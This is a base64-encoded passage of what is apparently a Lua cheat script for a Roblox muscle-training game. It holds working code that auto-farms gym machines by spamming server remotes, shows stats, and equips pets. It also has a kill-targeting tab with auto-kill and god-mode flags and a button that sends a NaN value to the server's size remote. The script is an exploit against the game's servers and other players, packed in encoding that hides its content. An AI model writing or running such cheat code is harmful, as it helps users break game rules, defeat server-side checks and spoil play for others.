AgICAgICAgICAgICAgIGN1cnJlbnRNYWNoaW5lID0gbWFjaGluZU5hbWUNCiAgICAgICAgICAgICAgICBjdXJyZW50TWFjaGluZUFjdGl2ZSA9IHRydWUNCiAgICAgICAgICAgIGVuZA0KICAgICAgICBlbmQNCiAgICBlbmQpDQplbmQNCg0KLS0gRnVuY3Rpb24gdG8gc3RvcCB1c2luZyBtYWNoaW5lDQpsb2NhbCBmdW5jdGlvbiBzdG9wTWFjaGluZSgpDQogICAgcGNhbGwoZnVuY3Rpb24oKQ0KICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyDQogICAgICAgIGlmIGNoYXJhY3RlciB0aGVuDQogICAgICAgICAgICBjaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID0gZmFsc2UNCiAgICAgICAgICAgIGNoYXJhY3Rlci5IdW1hbm9pZC5KdW1wID0gdHJ1ZQ0KICAgICAgICAgICAgY3VycmVudE1hY2hpbmUgPSBuaWwNCiAgICAgICAgICAgIGN1cnJlbnRNYWNoaW5lQWN0aXZlID0gZmFsc2UNCiAgICAgICAgZW5kDQogICAgZW5kKQ0KZW5kDQoNCi0tIEZ1bmN0aW9uIHRvIGRvIHJlcHMgb24gY3VycmVudCBtYWNoaW5lDQpsb2NhbCBmdW5jdGlvbiBkb01hY2hpbmVSZXBzKCkNCiAgICBpZiBjdXJyZW50TWFjaGluZUFjdGl2ZSBhbmQgY3VycmVudE1hY2hpbmUgdGhlbg0KICAgICAgICBwY2FsbChmdW5jdGlvbigpDQogICAgICAgICAgICBsb2NhbCBtYWNoaW5lID0gd29ya3NwYWNlLm1hY2hpbmVzRm9sZGVyOkZpbmRGaXJzdENoaWxkKGN1cnJlbnRNYWNoaW5lKQ0KICAgICAgICAgICAgaWYgbWFjaGluZSBhbmQgbWFjaGluZTpGaW5kRmlyc3RDaGlsZCgiaW50ZXJhY3RTZWF0IikgdGhlbg0KICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLm1hY2hpbmVJbnRlcmFjdFJlbW90ZTpJbnZva2VTZXJ2ZXIoInVzZU1hY2hpbmUiLCBtYWNoaW5lLmludGVyYWN0U2VhdCkNCiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJyZXAiLCBtYWNoaW5lLmludGVyYWN0U2VhdCkNCiAgICAgICAgICAgIGVuZA0KICAgICAgICBlbmQpDQogICAgZW5kDQplbmQNCg0KLS0gTWFjaGluZSBUb2dnbGUgQ3JlYXRvciBGdW5jdGlvbg0KbG9jYWwgZnVuY3Rpb24gY3JlYXRlTWFjaGluZVRvZ2dsZShwYXJlbnQsIHRpdGxlLCBtYWNoaW5lTmFtZSwgc3RhdGVWYXIpDQogICAgcGFyZW50OlRvZ2dsZSh7DQogICAgICAgIFRpdGxlID0gdGl0bGUsDQogICAgICAgIERlc2MgPSAiQXV0byB1c2UgIiAuLiBtYWNoaW5lTmFtZSwNCiAgICAgICAgVmFsdWUgPSBmYWxzZSwNCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkNCiAgICAgICAgICAgIHN0YXRlVmFyID0gc3RhdGUNCiAgICAgICAgICAgIGlmIHN0YXRlIHRoZW4NCiAgICAgICAgICAgICAgICBzdG9wTWFjaGluZSgpDQogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkNCiAgICAgICAgICAgICAgICBzZXR1cE1hY2hpbmUobWFjaGluZU5hbWUpDQogICAgICAgICAgICAgICAgd2hpbGUgc3RhdGVWYXIgYW5kIGN1cnJlbnRNYWNoaW5lID09IG1hY2hpbmVOYW1lIGRvDQogICAgICAgICAgICAgICAgICAgIGRvTWFjaGluZVJlcHMoKQ0KICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wMSkNCiAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICBpZiBjdXJyZW50TWFjaGluZSA9PSBtYWNoaW5lTmFtZSB0aGVuDQogICAgICAgICAgICAgICAgICAgIHN0b3BNYWNoaW5lKCkNCiAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgIGVuZA0KICAgICAgICBlbmQNCiAgICB9KQ0KZW5kDQoNCi0tIFRpbnkgR3ltIFNlY3Rpb24NCkd5bVRhYjpTZWN0aW9uKHtUaXRsZSA9ICLwn4+gIFRpbnkgR3ltIn0pDQpsb2NhbCB0aW55QmVuY2gsIHRpbnlTcXVhdCwgdGlueVB1bGx1cHMsIHRpbnlEZWFkbGlmdCA9IGZhbHNlLCBmYWxzZSwgZmFsc2UsIGZhbHNlDQoNCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiQmVuY2ggUHJlc3MiLCAiQmVuY2ggUHJlc3MiLCB0aW55QmVuY2gpDQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIlNxdWF0IFJhY2siLCAiU3F1YXQgUmFjayIsIHRpbnlTcXVhdCkNCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiUHVsbHVwcyIsICJQdWxsdXBzIiwgdGlueVB1bGx1cHMpDQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkRlYWRsaWZ0IiwgIkRlYWRsaWZ0IiwgdGlueURlYWRsaWZ0KQ0KDQotLSBGcm9zdCBHeW0gU2VjdGlvbg0KR3ltVGFiOlNlY3Rpb24oe1RpdGxlID0gIuKdhO+4jyBGcm9zdCBHeW0ifSkNCmxvY2FsIGZyb3N0UHJlc3MsIGZyb3N0TGlmdCwgZnJvc3RTcXVhdCwgZnJvc3RCb3VsZGVyID0gZmFsc2UsIGZhbHNlLCBmYWxzZSwgZmFsc2UNCg0KY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJGcm9zdCBQcmVzcyIsICJGcm9zdCBQcmVzcyIsIGZyb3N0UHJlc3MpDQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkZyb3N0IExpZnQiLCAiRnJvc3QgTGlmdCIsIGZyb3N0TGlmdCkNCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiRnJvc3QgU3F1YXQiLCAiRnJvc3QgU3F1YXQiLCBmcm9zdFNxdWF0KQ0KY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJCb3VsZGVyIFRocm93IiwgIkJvdWxkZXIgVGhyb3ciLCBmcm9zdEJvdWxkZXIpDQoNCi0tIE15dGhpY2FsIEd5bSBTZWN0aW9uDQpHeW1UYWI6U2VjdGlvbih7VGl0bGUgPSAi4pyoIE15dGhpY2FsIEd5bSJ9KQ0KbG9jYWwgbXl0aGljYWxQcmVzcywgbXl0aGljYWxQdWxsdXAsIG15dGhpY2FsVGhyb3cgPSBmYWxzZSwgZmFsc2UsIGZhbHNlDQoNCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiTXl0aGljYWwgUHJlc3MiLCAiTXl0aGljYWwgUHJlc3MiLCBteXRoaWNhbFByZXNzKQ0KY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJNeXRoaWNhbCBQdWxsdXAiLCAiTXl0aGljYWwgUHVsbHVwIiwgbXl0aGljYWxQdWxsdXApDQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIk15dGhpY2FsIFRocm93IiwgIk15dGhpY2FsIFRocm93IiwgbXl0aGljYWxUaHJvdykNCg0KLS0gSW5mZXJubyBHeW0gU2VjdGlvbg0KR3ltVGFiOlNlY3Rpb24oe1RpdGxlID0gIvCflKUgSW5mZXJubyBHeW0ifSkNCmxvY2FsIGV0ZXJuYWxQcmVzcyA9IGZhbHNlDQoNCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiRXRlcm5hbCBQcmVzcyIsICJFdGVybmFsIFByZXNzIiwgZXRlcm5hbFByZXNzKQ0KDQotLSBMZWdlbmRzIEd5bSBTZWN0aW9uDQpHeW1UYWI6U2VjdGlvbih7VGl0bGUgPSAi8J+MnyBMZWdlbmRzIEd5bSJ9KQ0KbG9jYWwgbGVnZW5kc1ByZXNzLCBsZWdlbmRzTGlmdCwgbGVnZW5kc1NxdWF0LCBsZWdlbmRzUHVsbHVwLCBsZWdlbmRzVGhyb3cgPSBmYWxzZSwgZmFsc2UsIGZhbHNlLCBmYWxzZSwgZmFsc2UNCg0KY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJMZWdlbmRzIFByZXNzIiwgIkxlZ2VuZHMgUHJlc3MiLCBsZWdlbmRzUHJlc3MpDQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkxlZ2VuZHMgTGlmdCIsICJMZWdlbmRzIExpZnQiLCBsZWdlbmRzTGlmdCkNCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiTGVnZW5kcyBTcXVhdCIsICJMZWdlbmRzIFNxdWF0IiwgbGVnZW5kc1NxdWF0KQ0KY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJMZWdlbmRzIFB1bGx1cCIsICJMZWdlbmRzIFB1bGx1cCIsIGxlZ2VuZHNQdWxsdXApDQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkxlZ2VuZHMgVGhyb3ciLCAiTGVnZW5kcyBUaHJvdyIsIGxlZ2VuZHNUaHJvdykNCg0KLS0gTXVzY2xlIEtpbmcgR3ltIFNlY3Rpb24NCkd5bVRhYjpTZWN0aW9uKHtUaXRsZSA9ICLwn5GRIE11c2NsZSBLaW5nIEd5bSJ9KQ0KbG9jYWwga2luZ0JlbmNoLCBraW5nTGlmdCwga2luZ1NxdWF0LCBraW5nTW91bnRhaW4sIGtpbmdCb3VsZGVyID0gZmFsc2UsIGZhbHNlLCBmYWxzZSwgZmFsc2UsIGZhbHNlDQoNCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiTXVzY2xlIEtpbmcgQmVuY2giLCAiTXVzY2xlIEtpbmcgQmVuY2giLCBraW5nQmVuY2gpDQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIk11c2NsZSBLaW5nIExpZnQiLCAiTXVzY2xlIEtpbmcgTGlmdCIsIGtpbmdMaWZ0KQ0KY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJNdXNjbGUgS2luZyBTcXVhdCIsICJNdXNjbGUgS2luZyBTcXVhdCIsIGtpbmdTcXVhdCkNCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiTXVzY2xlIEtpbmcgTW91bnRhaW4iLCAiTXVzY2xlIEtpbmcgTW91bnRhaW4iLCBraW5nTW91bnRhaW4pDQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIktpbmcgQm91bGRlciIsICJLaW5nIEJvdWxkZXIiLCBraW5nQm91bGRlcikNCg0KLS0gSnVuZ2xlIEd5bSBTZWN0aW9uDQpHeW1UYWI6U2VjdGlvbih7VGl0bGUgPSAi8J+MtCBKdW5nbGUgR3ltIn0pDQpsb2NhbCBqdW5nbGVCZW5jaCwganVuZ2xlTGlmdCwganVuZ2xlU3F1YXQsIGp1bmdsZUJvdWxkZXIgPSBmYWxzZSwgZmFsc2UsIGZhbHNlLCBmYWxzZQ0KDQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkp1bmdsZSBCZW5jaCIsICJKdW5nbGUgQmVuY2giLCBqdW5nbGVCZW5jaCkNCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiSnVuZ2xlIEJhciBMaWZ0IiwgIkp1bmdsZSBCYXIgTGlmdCIsIGp1bmdsZUxpZnQpDQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkp1bmdsZSBTcXVhdCIsICJKdW5nbGUgU3F1YXQiLCBqdW5nbGVTcXVhdCkNCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiSnVuZ2xlIEJvdWxkZXIiLCAiSnVuZ2xlIEJvdWxkZXIiLCBqdW5nbGVCb3VsZGVyKQ0KDQotLSBTdGF0cyBUYWINCmxvY2FsIFN0YXRzVGFiID0gV2luZG93OlRhYih7VGl0bGUgPSAiU3RhdHMiLCBJY29uID0gImFjdGl2aXR5In0pDQoNCi0tIFNlc3Npb24gVGltZXIgU2VjdGlvbg0KU3RhdHNUYWI6U2VjdGlvbih7VGl0bGUgPSAiU2Vzc2lvbiBUaW1lciJ9KQ0KbG9jYWwgdGltZXJMYWJlbCA9IFN0YXRzVGFiOkxhYmVsKHtUaXRsZSA9ICLij7AgVElNRSIsIERlc2MgPSAiMHMgMG0gMGggMGQifSkNCg0KdGFzay5zcGF3bihmdW5jdGlvbigpDQogICAgbG9jYWwgc3RhcnRUaW1lID0gdGljaygpDQogICAgDQogICAgd2hpbGUgdGFzay53YWl0KDEpIGRvDQogICAgICAgIGxvY2FsIGVsYXBzZWQgPSB0aWNrKCkgLSBzdGFydFRpbWUNCiAgICAgICAgDQogICAgICAgIGxvY2FsIHNlY29uZHMgPSBtYXRoLmZsb29yKGVsYXBzZWQgJSA2MCkNCiAgICAgICAgbG9jYWwgbWludXRlcyA9IG1hdGguZmxvb3IoKGVsYXBzZWQgLyA2MCkgJSA2MCkgDQogICAgICAgIGxvY2FsIGhvdXJzID0gbWF0aC5mbG9vcigoZWxhcHNlZCAvIDM2MDApICUgMjQpDQogICAgICAgIGxvY2FsIGRheXMgPSBtYXRoLmZsb29yKGVsYXBzZWQgLyA4NjQwMCkNCiAgICAgICAgDQogICAgICAgIHRpbWVyTGFiZWw6U2V0RGVzYyhzdHJpbmcuZm9ybWF0KCIlZHMgJWRtICVkaCAlZGQiLCBzZWNvbmRzLCBtaW51dGVzLCBob3VycywgZGF5cykpDQogICAgZW5kDQplbmQpDQoNCi0tIFN0YXRzIERpc3BsYXkgU2VjdGlvbg0KU3RhdHNUYWI6U2VjdGlvbih7VGl0bGUgPSAi8J+TiiBTVEFUUyJ9KQ0KDQotLSBIZWxwZXIgZnVuY3Rpb24gdG8gZm9ybWF0IG51bWJlcnMNCmxvY2FsIGZ1bmN0aW9uIGZvcm1hdE51bWJlcih2YWx1ZSkNCiAgICBsb2NhbCByYXdGb3JtYXR0ZWQgPSB0b3N0cmluZyh2YWx1ZSk6cmV2ZXJzZSgpOmdzdWIoIiVkJWQlZCIsICIlMSwiKTpyZXZlcnNlKCk6Z3N1YigiXiwiLCAiIikNCiAgICANCiAgICBsb2NhbCBhYmJyZXZpYXRlZCA9ICIiDQogICAgaWYgdmFsdWUgPj0gMTAwMDAwMDAwMDAwMDAwMDAwMCB0aGVuDQogICAgICAgIGFiYnJldmlhdGVkID0gc3RyaW5nLmZvcm1hdCgiJS4xZlFpIiwgdmFsdWUgLyAxMDAwMDAwMDAwMDAwMDAwMDAwKQ0KICAgIGVsc2VpZiB2YWx1ZSA+PSAxMDAwMDAwMDAwMDAwMDAwIHRoZW4NCiAgICAgICAgYWJicmV2aWF0ZWQgPSBzdHJpbmcuZm9ybWF0KCIlLjFmUWEiLCB2YWx1ZSAvIDEwMDAwMDAwMDAwMDAwMDApDQogICAgZWxzZWlmIHZhbHVlID49IDEwMDAwMDAwMDAwMDAgdGhlbg0KICAgICAgICBhYmJyZXZpYXRlZCA9IHN0cmluZy5mb3JtYXQoIiUuMWZUIiwgdmFsdWUgLyAxMDAwMDAwMDAwMDAwKQ0KICAgIGVsc2VpZiB2YWx1ZSA+PSAxMDAwMDAwMDAwIHRoZW4NCiAgICAgICAgYWJicmV2aWF0ZWQgPSBzdHJpbmcuZm9ybWF0KCIlLjFmQiIsIHZhbHVlIC8gMTAwMDAwMDAwMCkNCiAgICBlbHNlaWYgdmFsdWUgPj0gMTAwMDAwMCB0aGVuDQogICAgICAgIGFiYnJldmlhdGVkID0gc3RyaW5nLmZvcm1hdCgiJS4xZk0iLCB2YWx1ZSAvIDEwMDAwMDApDQogICAgZWxzZWlmIHZhbHVlID49IDEwMDAgdGhlbg0KICAgICAgICBhYmJyZXZpYXRlZCA9IHN0cmluZy5mb3JtYXQoIiUuMWZLIiwgdmFsdWUgLyAxMDAwKQ0KICAgIGVsc2UNCiAgICAgICAgYWJicmV2aWF0ZWQgPSB0b3N0cmluZyh2YWx1ZSkNCiAgICBlbmQNCiAgICANCiAgICByZXR1cm4gcmF3Rm9ybWF0dGVkLCBhYmJyZXZpYXRlZA0KZW5kDQoNCi0tIEhlbHBlciBmdW5jdGlvbiB0byBjcmVhdGUgc3RhdCBkaXNwbGF5DQpsb2NhbCBmdW5jdGlvbiBjcmVhdGVTdGF0RGlzcGxheShzdGF0TmFtZSwgZW1vamksIHN0YXRQYXRoLCBpc0xlYWRlcnN0YXQpDQogICAgbG9jYWwgbGFiZWwgPSBTdGF0c1RhYjpMYWJlbCh7VGl0bGUgPSBlbW9qaSAuLiAiICIgLi4gc3RhdE5hbWUsIERlc2MgPSAiMCAoMCkgfCBHQUlORUQ6IDAgKDApIn0pDQogICAgbG9jYWwgc3RhcnRWYWx1ZSA9IGlzTGVhZGVyc3RhdCBhbmQgDQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5sZWFkZXJzdGF0c1tzdGF0UGF0aF0uVmFsdWUgb3IgDQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcltzdGF0UGF0aF0uVmFsdWUNCiAgICANCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkNCiAgICAgICAgd2hpbGUgdGFzay53YWl0KDEpIGRvDQogICAgICAgICAgICBsb2NhbCBjdXJyZW50VmFsdWUgPSBpc0xlYWRlcnN0YXQgYW5kIA0KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5sZWFkZXJzdGF0c1tzdGF0UGF0aF0uVmFsdWUgb3IgDQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyW3N0YXRQYXRoXS5WYWx1ZQ0KICAgICAgICAgICAgbG9jYWwgZ2FpbmVkID0gY3VycmVudFZhbHVlIC0gc3RhcnRWYWx1ZQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBsb2NhbCBjdXJyZW50UmF3LCBjdXJyZW50QWJiciA9IGZvcm1hdE51bWJlcihjdXJyZW50VmFsdWUpDQogICAgICAgICAgICBsb2NhbCBnYWluZWRSYXcsIGdhaW5lZEFiYnIgPSBmb3JtYXROdW1iZXIoZ2FpbmVkKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBsYWJlbDpTZXREZXNjKHN0cmluZy5mb3JtYXQoIiVzICglcykgfCBHQUlORUQ6ICVzICglcykiLCANCiAgICAgICAgICAgICAgICBjdXJyZW50UmF3LCBjdXJyZW50QWJiciwgZ2FpbmVkUmF3LCBnYWluZWRBYmJyKSkNCiAgICAgICAgZW5kDQogICAgZW5kKQ0KICAgIA0KICAgIHJldHVybiBsYWJlbA0KZW5kDQoNCi0tIENyZWF0ZSBhbGwgc3RhdCBkaXNwbGF5cw0KY3JlYXRlU3RhdERpc3BsYXkoIlN0cmVuZ3RoIiwgIvCfkqoiLCAiU3RyZW5ndGgiLCB0cnVlKQ0KY3JlYXRlU3RhdERpc3BsYXkoIkR1cmFiaWxpdHkiLCAi8J+boe+4jyIsICJEdXJhYmlsaXR5IiwgZmFsc2UpDQpjcmVhdGVTdGF0RGlzcGxheSgiQWdpbGl0eSIsICLimqEiLCAiQWdpbGl0eSIsIGZhbHNlKQ0KY3JlYXRlU3RhdERpc3BsYXkoIlJlYmlydGhzIiwgIvCflIQiLCAiUmViaXJ0aHMiLCB0cnVlKQ0KY3JlYXRlU3RhdERpc3BsYXkoIkJyYXdscyIsICLwn6WKIiwgIkJyYXdscyIsIHRydWUpDQpjcmVhdGVTdGF0RGlzcGxheSgiS2lsbHMiLCAi8J+SgCIsICJLaWxscyIsIHRydWUpDQpjcmVhdGVTdGF0RGlzcGxheSgiR29vZCBLYXJtYSIsICLwn5iHIiwgImdvb2RLYXJtYSIsIGZhbHNlKQ0KY3JlYXRlU3RhdERpc3BsYXkoIkV2aWwgS2FybWEiLCAi8J+YiCIsICJldmlsS2FybWEiLCBmYWxzZSkNCg0KLS0gS2lsbHMgVGFiDQpsb2NhbCBLaWxsc1RhYiA9IFdpbmRvdzpUYWIoe1RpdGxlID0gIktpbGxzIiwgSWNvbiA9ICJ0YXJnZXQifSkNCg0KbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpDQpsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXINCmxvY2FsIHBsYXllcldoaXRlbGlzdCA9IHt9DQpsb2NhbCB0YXJnZXRQbGF5ZXJOYW1lcyA9IHt9DQpsb2NhbCBhdXRvS2lsbCA9IGZhbHNlDQpsb2NhbCBraWxsVGFyZ2V0ID0gZmFsc2UNCmxvY2FsIHNweWluZyA9IGZhbHNlDQpsb2NhbCBhdXRvUHVuY2hOb0FuaW0gPSBmYWxzZQ0KbG9jYWwgdGFyZ2V0RHJvcGRvd25JdGVtcyA9IHt9DQpsb2NhbCBmcmllbmRXaGl0ZWxpc3RBY3RpdmUgPSBmYWxzZQ0KbG9jYWwgZ29kTW9kZVRvZ2dsZSA9IGZhbHNlDQpsb2NhbCBmb2xsb3dpbmcgPSBmYWxzZQ0KbG9jYWwgZm9sbG93VGFyZ2V0ID0gbmlsDQpsb2NhbCBnb2REYW1hZ2VBY3RpdmUgPSBmYWxzZQ0KDQotLSBQZXQgU2VsZWN0aW9uIFNlY3Rpb24NCktpbGxzVGFiOlNlY3Rpb24oe1RpdGxlID0gIkVxdWlwIFBldHMifSkNCg0KbG9jYWwgcGV0RHJvcGRvd24gPSBLaWxsc1RhYjpEcm9wZG93bih7DQogICAgVGl0bGUgPSAiU2VsZWN0IFBldCIsDQogICAgTGlzdCA9IHsiV2lsZCBXaXphcmQiLCAiTWlnaHR5IE1vbnN0ZXIifSwNCiAgICBWYWx1ZSA9ICIiLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24odGV4dCkNCiAgICAgICAgbG9jYWwgcGV0c0ZvbGRlciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5wZXRzRm9sZGVyDQogICAgICAgIGZvciBfLCBmb2xkZXIgaW4gcGFpcnMocGV0c0ZvbGRlcjpHZXRDaGlsZHJlbigpKSBkbw0KICAgICAgICAgICAgaWYgZm9sZGVyOklzQSgiRm9sZGVyIikgdGhlbg0KICAgICAgICAgICAgICAgIGZvciBfLCBwZXQgaW4gcGFpcnMoZm9sZGVyOkdldENoaWxkcmVuKCkpIGRvDQogICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLmVxdWlwUGV0RXZlbnQ6RmlyZVNlcnZlcigidW5lcXVpcFBldCIsIHBldCkNCiAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgIGVuZA0KICAgICAgICBlbmQNCiAgICAgICAgdGFzay53YWl0KDAuMikNCg0KICAgICAgICBsb2NhbCBwZXROYW1lID0gdGV4dA0KICAgICAgICBsb2NhbCBwZXRzVG9FcXVpcCA9IHt9DQoNCiAgICAgICAgZm9yIF8sIHBldCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIucGV0c0ZvbGRlci5VbmlxdWU6R2V0Q2hpbGRyZW4oKSkgZG8NCiAgICAgICAgICAgIGlmIHBldC5OYW1lID09IHBldE5hbWUgdGhlbg0KICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChwZXRzVG9FcXVpcCwgcGV0KQ0KICAgICAgICAgICAgZW5kDQogICAgICAgIGVuZA0KDQogICAgICAgIGxvY2FsIG1heFBldHMgPSA4DQogICAgICAgIGxvY2FsIGVxdWlwcGVkQ291bnQgPSBtYXRoLm1pbigjcGV0c1RvRXF1aXAsIG1heFBldHMpDQoNCiAgICAgICAgZm9yIGkgPSAxLCBlcXVpcHBlZENvdW50IGRvDQogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5lcXVpcFBldEV2ZW50OkZpcmVTZXJ2ZXIoImVxdWlwUGV0IiwgcGV0c1RvRXF1aXBbaV0pDQogICAgICAgICAgICB0YXNrLndhaXQoMC4xKQ0KICAgICAgICBlbmQNCiAgICBlbmQNCn0pDQoNCi0tIFV0aWxpdHkgU2VjdGlvbg0KS2lsbHNUYWI6U2VjdGlvbih7VGl0bGUgPSAiVXRpbGl0eSJ9KQ0KDQpLaWxsc1RhYjpCdXR0b24oew0KICAgIFRpdGxlID0gIk5hTiBTaXplIiwNCiAgICBEZXNjID0gIlNldCBjaGFyYWN0ZXIgc2l6ZSB0byBOYU4iLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQ0KICAgICAgICBsb2NhbCBhcmdzID0geyJjaGFuZ2VTaXplIiwgMC8wfQ0KICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIik6V2FpdEZvckNoaWxkKCJyRXZlbnRzIik6V2FpdEZvckNoaWxkKCJjaGFuZ2VTcGVlZFNpemVSZW1vdGUiKTpJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQ0KICAgIGVuZA0KfSkNCg0KLS0gV2hpdGVsaXN0IE1hbmFnZW1lbnQgU2VjdGlvbg0KS2lsbHNUYWI6U2VjdGlvbih7VGl0bGUgPSAiV2hpdGVsaXN0IE1hbmFnZW1lbnQifSkNCg0KS2lsbHNUYWI6VGV4dGJveCh7DQogICAgVGl0bGUgPSAiV2hpdGVsaXN0IFBsYXllciIsDQogICAgRGVzYyA9ICJBZGQgcGxheWVyIHRvIHdoaXRlbGlzdCIsDQogICAgUGxhY2Vob2xkZXIgPSAiUGxheWVyIE5hbWUiLA0KICAgIFZhbHVlID0gIiIsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0ZXh0KQ0KICAgICAgICBsb2NhbCB0YXJnZXQgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHRleHQpDQogICAgICAgIGlmIHRhcmdldCB0aGVuDQogICAgICAgICAgICBwbGF5ZXJXaGl0ZWxpc3RbdGFyZ2V0Lk5hbWVdID0gdHJ1ZQ0KICAgICAgICBlbmQNCiAgICBlbmQNCn0pDQoNCktpbGxzVGFiOlRleHRib3goew0KICAgIFRpdGxlID0gIlVuV2hpdGVsaXN0IFBsYXllciIsDQogICAgRGVzYyA9ICJSZW1vdmUgcGxheWVyIGZyb20gd2hpdGVsaXN0IiwNCiAgICBQbGFjZWhvbGRlciA9ICJQbGF5ZXIgTmFtZSIsDQogICAgVmFsdWUgPSAiIiwNCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHRleHQpDQogICAgICAgIGxvY2FsIHRhcmdldCA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQodGV4dCkNCiAgICAgICAgaWYgdGFyZ2V0IHRoZW4NCiAgICAgICAgICAgIHBsYXllcldoaXRlbGlzdFt0YXJnZXQuTmFtZV0gPSBuaWwNCiAgICAgICAgZW5kDQogICAgZW5kDQp9KQ0KDQpLaWxsc1RhYjpUb2dnbGUoew0KICAgIFRpdGxlID0gIkF1dG8gV2hpdGVsaXN0IEZyaWVuZHMiLA0KICAgIERlc2MgPSAiQXV0b21hdGljYWxseSB3aGl0ZWxpc3QgZnJpZW5kcyIsDQogICAgVmFsdWUgPSBmYWxzZSwNCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQ0KICAgICAgICBmcmllbmRXaGl0ZWxpc3RBY3RpdmUgPSBzdGF0ZQ0KDQogICAgICAgIGlmIHN0YXRlIHRoZW4NCiAgICAgICAgICAgIGZvciBfLCBwbGF5ZXIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbw0KICAgICAgICAgICAgICAgIGlmIHBsYXllciB+PSBMb2NhbFBsYXllciBhbmQgTG9jYWxQbGF5ZXI6SXNGcmllbmRzV2l0aChwbGF5ZXIuVXNlcklkKSB0aGVuDQogICAgICAgICAgICAgICAgICAgIHBsYXllcldoaXRlbGlzdFtwbGF5ZXIuTmFtZV0gPSB0cnVlDQogICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICBlbmQNCg0KICAgICAgICAgICAgUGxheWVycy5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBsYXllcikNCiAgICAgICAgICAgICAgICBpZiBmcmllbmRXaGl0ZWxpc3RBY3RpdmUgYW5kIHBsYXllciB+PSBMb2NhbFBsYXllciBhbmQgTG9jYWxQbGF5ZXI6SXNGcmllbmRzV2l0aChwbGF5ZXIuVXNlcklkKSB0aGVuDQogICAgICAgICAgICAgICAgICAgIHBsYXllcldoaXRlbGlzdFtwbGF5ZXIuTmFtZV0gPSB0cnVlDQogICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICBlbmQpDQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIGZvciBuYW1lIGluIHBhaXJzKHBsYXllcldoaXRlbGlzdCkgZG8NCiAgICAgICAgICAgICAgICBsb2NhbCBmcmllbm